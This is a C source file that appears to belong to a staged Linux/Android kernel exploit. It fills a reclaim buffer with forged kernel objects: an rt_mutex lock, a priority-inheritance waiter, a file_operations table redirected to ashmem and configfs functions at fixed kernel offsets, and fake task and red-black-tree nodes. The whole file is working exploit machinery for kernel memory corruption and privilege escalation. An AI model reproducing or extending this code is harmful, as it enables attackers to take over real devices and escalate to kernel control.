/*
 * Builds the in-memory object layout used by the reclaim stage. Writes a fake
 * lock, PI waiter, file_operations table, task fields, and red-black-tree
 * nodes into one buffer.
 */

#include <string.h>

#include "04_fake_kernel_objects.h"

static void put64(unsigned char *base, size_t off, uint64_t value) {
  memcpy(base + off, &value, sizeof(value));
}

static void put32(unsigned char *base, size_t off, uint32_t value) {
  memcpy(base + off, &value, sizeof(value));
}

static void put_fake_waiter(unsigned char *scratch, size_t w0,
                             uint64_t pi_parent, uint64_t pi_right,
                             uint64_t pi_left, uint64_t task, uint64_t lock,
                             uint32_t prio) {
  put64(scratch, w0 + 0x00, 1);           /* tree_entry.parent_color */
  put64(scratch, w0 + 0x08, 0);           /* tree_entry.rb_right */
  put64(scratch, w0 + 0x10, 0);           /* tree_entry.rb_left */
  put64(scratch, w0 + 0x18, pi_parent);   /* pi_tree_entry.parent_color */
  put64(scratch, w0 + 0x20, pi_right);    /* pi_tree_entry.rb_right */
  put64(scratch, w0 + 0x28, pi_left);     /* pi_tree_entry.rb_left */
  put64(scratch, w0 + 0x30, task);        /* task */
  put64(scratch, w0 + 0x38, lock);        /* lock */
  put64(scratch, w0 + 0x40, 0);           /* wake_state (4B, rest zero) */
  put32(scratch, w0 + 0x44, prio);        /* prio */
  put64(scratch, w0 + 0x48, 0);           /* deadline */
  put64(scratch, w0 + 0x50, 0);           /* ww_ctx */
}

static void put_fake_fops(unsigned char *scratch, uint64_t kernel_base,
                           uint64_t self_ref, size_t table_base) {
  uint64_t ashmem_ioctl = kernel_base + 0x0114c6dcULL;
  uint64_t configfs_read_iter = kernel_base + 0x005d7420ULL;
  uint64_t copy_splice_read = kernel_base + 0x00528198ULL;

  put64(scratch, table_base + 0x00, 0);           /* FOPS_OWNER_OFF */
  put64(scratch, table_base + 0x08, self_ref);    /* FOPS_LLSEEK_OFF */
  put64(scratch, table_base + 0x10, 0);           /* FOPS_READ_OFF */
  put64(scratch, table_base + 0x18, 0);           /* FOPS_WRITE_OFF */
  put64(scratch, table_base + 0x20, configfs_read_iter); /* FOPS_READ_ITER_OFF */
  put64(scratch, table_base + 0x28, configfs_read_iter + 0xa28ULL); /* FOPS_WRITE_ITER_OFF = CONFIGFS_BIN_WRITE_ITER */
  put64(scratch, table_base + 0x50, ashmem_ioctl);          /* FOPS_IOCTL_OFF */
  put64(scratch, table_base + 0x58, ashmem_ioctl + 0x65cULL); /* FOPS_COMPAT_IOCTL_OFF */
  put64(scratch, table_base + 0x60, ashmem_ioctl + 0x6b4ULL); /* FOPS_MMAP_OFF */
  put64(scratch, table_base + 0x70, ashmem_ioctl + 0x994ULL); /* FOPS_OPEN_OFF */
  put64(scratch, table_base + 0x80, ashmem_ioctl + 0xa2cULL); /* FOPS_RELEASE_OFF */
  put64(scratch, table_base + 0xc8, copy_splice_read);        /* FOPS_SPLICE_READ_OFF */
  put64(scratch, table_base + 0xe0, ashmem_ioctl + 0xb48ULL); /* FOPS_SHOW_FDINFO_OFF */
}

static void put_fake_task(unsigned char *scratch, uint64_t self_ref,
                           uint64_t root_task_group, uint64_t init_task_addr) {
  put32(scratch, 0x3200 + 0x38, 0x100);  /* FAKE_TASK_USAGE_OFF */
  put32(scratch, 0x3200 + 0x7c, 0x78);   /* FAKE_TASK_PRIO_OFF */
  put32(scratch, 0x3200 + 0x84, 0x78);   /* FAKE_TASK_NORMAL_PRIO_OFF */
  put64(scratch, 0x3200 + 0x884, 0);     /* FAKE_TASK_PI_LOCK_OFF */
  put64(scratch, 0x3200 + 0x898, self_ref); /* FAKE_TASK_PI_WAITERS_OFF (rb_root) */
  put64(scratch, 0x3200 + 0x8a0, self_ref); /* pi_waiters.rb_leftmost */
  put64(scratch, 0x3200 + 0x400, root_task_group); /* FAKE_TASK_TASK_GROUP_OFF */
  put64(scratch, 0x3200 + 0x8a8, init_task_addr);  /* FAKE_TASK_PI_TOP_TASK_OFF */
  put64(scratch, 0x3200 + 0x8b0, 0);     /* FAKE_TASK_PI_BLOCKED_ON_OFF */
}

void build_fops_install_object(unsigned char *scratch, uint64_t aligned_base,
                                uint64_t kernel_base,
                                uint64_t ashmem_misc_fops_addr,
                                uint64_t init_task_addr) {
  memset(scratch, 0, FOPS_INSTALL_PAGE_SIZE);

  uint64_t lock_waiters_self_ref = aligned_base | 0x14d0ULL;
  uint64_t pi_waiters_self_ref = aligned_base | 0x14e8ULL;
  uint64_t pi_parent = aligned_base | 0x1180ULL;
  uint64_t waiter_lock = aligned_base | 0x1390ULL;
  uint64_t root_task_group = kernel_base + 0x02cb9ac0ULL;

  put64(scratch, 0x2210, 0);                    /* lock.wait_lock = 0 */
  put64(scratch, 0x2218, lock_waiters_self_ref); /* lock.waiters.rb_root */
  put64(scratch, 0x2220, lock_waiters_self_ref); /* lock.waiters.rb_leftmost */
  put64(scratch, 0x2228, 1);                     /* lock.owner = 1 (SLIDE_LOCK_OWNER-equivalent slot) */

  put_fake_waiter(scratch, 0x2350, pi_parent, ashmem_misc_fops_addr, 0,
                  init_task_addr, waiter_lock, 0x82);

  put_fake_fops(scratch, kernel_base, pi_waiters_self_ref, 0x2000);
  put_fake_task(scratch, pi_waiters_self_ref, root_task_group, init_task_addr);

  /* RIGHT_OFF / LEFT_OFF: two more fake rb_node objects, both parented
   * back at pi_parent (aligned_base|0x1180) -- same value used above for
   * the waiter's pi_tree_entry.parent_color. */
  put64(scratch, 0x4440, pi_parent);
  put64(scratch, 0x4448, 0);
  put64(scratch, 0x4450, 0);
  put64(scratch, 0x5550, pi_parent);
  put64(scratch, 0x5558, 0);
  put64(scratch, 0x5560, 0);

}
